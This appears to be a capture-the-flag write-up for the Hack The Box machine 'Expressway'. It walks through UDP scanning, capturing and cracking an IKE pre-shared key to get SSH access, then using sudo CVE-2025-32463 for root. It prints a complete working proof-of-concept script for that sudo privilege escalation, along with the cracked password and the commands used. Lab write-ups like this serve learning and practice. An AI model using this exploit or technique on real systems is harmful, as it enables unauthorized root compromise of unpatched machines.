---
title: HTB-Express-Linux
date: 2025-10-23
tags:
  - htb
  - linux
  - dfir
  - hacking
  - ike
  - psk
  - wordlists
  - CVE-2025-32463
draft: false
---
### How to get the User flag?
This machine doesn’t have a guided mode. There are only two fields: one for the `user flag` and one for the `root flag`. Other than the IP address, no information is given, so the idea is probably to start with a port scan. When I scanned the TCP ports using `rustscan` or `nmap`, only port 22 (SSH) was open. Since `rustscan` doesn’t support UDP scans, I used nmap instead, and it showed more open ports on UDP.
#### Step1. UDP ports scanning
```
┌──(kali㉿kali)-[~/Templates]
└─$ nmap -sU --top-ports 100 10.10.11.87
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-21 02:35 EDT
Nmap scan report for 10.10.11.87
Host is up (0.83s latency).
Not shown: 92 closed udp ports (port-unreach)
PORT      STATE         SERVICE
53/udp    open|filtered domain
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
500/udp   open          isakmp
4500/udp  open|filtered nat-t-ike
32769/udp open|filtered filenet-rpc
49153/udp open|filtered unknown
49194/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 193.41 seconds
```
#### Step2. ike-scan and get psk
```
┌──(kali㉿kali)-[~/Templates]
└─$ ike-scan -A -P psk.params 10.10.11.87
WARNING: gethostbyname failed for "psk.params" - target ignored: Resource temporarily unavailable
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=0e1c97b8743a080d) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
89f99e1a29cb59037b14f3325d46bbfd25b2260551c8a167a85ec24cde9caa30ab9c50d7cc452f0cafbfa5b6b2c9d18951b85bf84eeafcb2ebd0622cda81fa86b62a35b935dba47788684bc8d1cf2e1e265b412842757323af7e2e507bec093176409d38a6568eb8ff74d942c981a735dba5813c042f8aa186dd864cacf941cb:03d99ac0667b18937a39b7912a7aef4fe60a9301a88bd1e6eb8bff84323aa8623c4d5bbaea1f0cd11ff575dd2e1c6cd626061e62ccd9a796c5afedc416fb87d2d78ee95036e2e0b95e84afa53b39379772dd6ce3c0ab799234d25b44a3704ea46298f8fb439cab3395dff719f7c2b54883c99c5f9dfdcd04781a8769ebc1f070:0e1c97b8743a080d:2964183e2e566e68:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:85aa8a5d1c69c9cba730568a811c0f3c5b06ea2b:cf56c1597313e226750d658f65f11d522b610c6176607df78b1648a4fae0808b:9bd318f6efe2e690e83c377091b1621cf482ed3a
Ending ike-scan 1.9.6: 1 hosts scanned in 10.315 seconds (0.10 hosts/sec).  1 returned handshake; 0 returned notify
```
#### Step3. Get the password
```
┌──(kali㉿kali)-[~/Templates]
└─$ psk-crack -d /usr/share/wordlists/rockyou.txt psk.txt
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash dc96a3f62923879c4a2cd3ff60f0d3d9fbc8d298
Ending psk-crack: 8045040 iterations in 4.417 seconds (1821367.42 iterations/sec)
```
#### Step4. User login via SSH
```
┌──(kali㉿kali)-[~/Templates]
└─$ ssh ike@10.10.11.87
ike@10.10.11.87's password: 
Last login: Tue Oct 21 07:24:01 BST 2025 from 10.10.11.87 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Oct 21 07:27:05 2025 from 10.10.16.2
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
ike@expressway:~$ cat user.txt
user-flag
```
### How to get the Root flag?
I still don't have a clear idea of how to gain root privilege. Anyway, the installed sudo version (1.9.17) is affected by a local privilege escalation (LPE) vulnerability. You can to use PoC to gain root privilege.
```
#!/bin/bash
# sudo-chwoot.sh – PoC CVE-2025-32463
set -e

STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd "$STAGE"

# 1. NSS library
cat > woot1337.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void woot(void) {
    setreuid(0,0);          /* change to UID 0 */
    setregid(0,0);          /* change  to GID 0 */
    chdir("/");             /* exit from chroot */
    execl("/bin/bash","/bin/bash",NULL); /* root shell */
}
EOF

# 2. Mini chroot with toxic nsswitch.conf
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc            # make getgrnam() not fail

# 3. compile libnss_
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "[*] Running exploit…"
sudo -R woot woot                 # (-R <dir> <cmd>)
                                   # • the first “woot” is chroot
                                   # • the second “woot” is and inexistent
command
                                   #   (only needs resolve the user)

rm -rf "$STAGE"
```
#### Stage1. root privilege escalation
```
ike@expressway:~$ ./sudo-chwoot.sh 
[*] Running exploit…
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
root@expressway:/# cd /root
root@expressway:/root# cat root.txt 
root-flag
```
### Ref
- Target : https://app.hackthebox.com/machines/Expressway
- sudo exploit(CVE-2025-32463) : https://www.exploit-db.com/exploits/52352
